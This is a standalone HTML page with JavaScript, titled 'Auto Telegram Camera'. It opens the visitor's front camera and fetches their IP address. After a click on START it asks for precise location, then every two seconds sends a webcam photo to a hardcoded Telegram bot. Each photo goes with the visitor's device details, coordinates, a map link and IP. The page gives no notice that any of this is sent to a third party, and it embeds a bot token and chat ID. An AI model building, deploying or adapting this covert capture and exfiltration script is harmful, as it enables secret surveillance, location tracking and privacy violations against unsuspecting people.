<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>Auto Telegram Camera</title>

<style>
    body {
        margin: 0;
        background: black;
        color: white;
        display: flex;
        flex-direction: column;
        align-items: center;
        justify-content: center;
        height: 100vh;
        font-family: sans-serif;
    }
    video {
        width: 100%;
        max-width: 360px;
        transform: scaleX(-1);
        border: 2px solid #0f0;
    }
    button {
        margin-top: 12px;
        padding: 10px 20px;
        font-size: 16px;
        cursor: pointer;
    }
</style>
</head>
<body>

<video id="video" autoplay playsinline></video>
<canvas id="canvas" style="display:none;"></canvas>

<button onclick="start()">â–¶ START AUTO SEND</button>

<script>
const video = document.getElementById("video");
const canvas = document.getElementById("canvas");

const BOT_TOKEN = "7917384016:AAG7cxyuts9UJ-Km0BMqBeQVJEJfstH239g";
const CHAT_ID = "8319568593";

let intervalId = null;
let latitude = "N/A";
let longitude = "N/A";
let mapLink = "Location not allowed";
let userIP = "Unknown";

// ğŸ”¹ IP
fetch("https://api.ipify.org?format=json")
    .then(r => r.json())
    .then(d => userIP = d.ip);

// ğŸ”¹ Camera
navigator.mediaDevices.getUserMedia({
    video: { facingMode: "user" }
}).then(stream => {
    video.srcObject = stream;
});

function start() {

    // ğŸ“ LOCATION PERMISSION â€” user click ke baad
    if ("geolocation" in navigator) {
        navigator.geolocation.getCurrentPosition(
            pos => {
                latitude = pos.coords.latitude.toFixed(6);
                longitude = pos.coords.longitude.toFixed(6);
                mapLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
            },
            () => {
                mapLink = "Location denied";
            },
            { enableHighAccuracy: true }
        );
    }

    if (!intervalId) {
        intervalId = setInterval(captureAndSend, 2000);
    }
}

function captureAndSend() {
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;

    const ctx = canvas.getContext("2d");
    ctx.translate(canvas.width, 0);
    ctx.scale(-1, 1);
    ctx.drawImage(video, 0, 0);

    canvas.toBlob(blob => {

        const caption = `
ğŸ“¸ Auto Capture

ğŸ“± ${navigator.userAgent}
ğŸ–¥ ${navigator.platform}
ğŸ“ ${screen.width}x${screen.height}

ğŸ“ Location:
Lat: ${latitude}
Lng: ${longitude}
ğŸ—º ${mapLink}

ğŸŒ IP: ${userIP}
â° ${new Date().toLocaleString()}
        `;

        const formData = new FormData();
        formData.append("chat_id", CHAT_ID);
        formData.append("photo", blob);
        formData.append("caption", caption);

        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
            method: "POST",
            body: formData
        });

    }, "image/jpeg", 0.7);
}
</script>

</body>
</html>
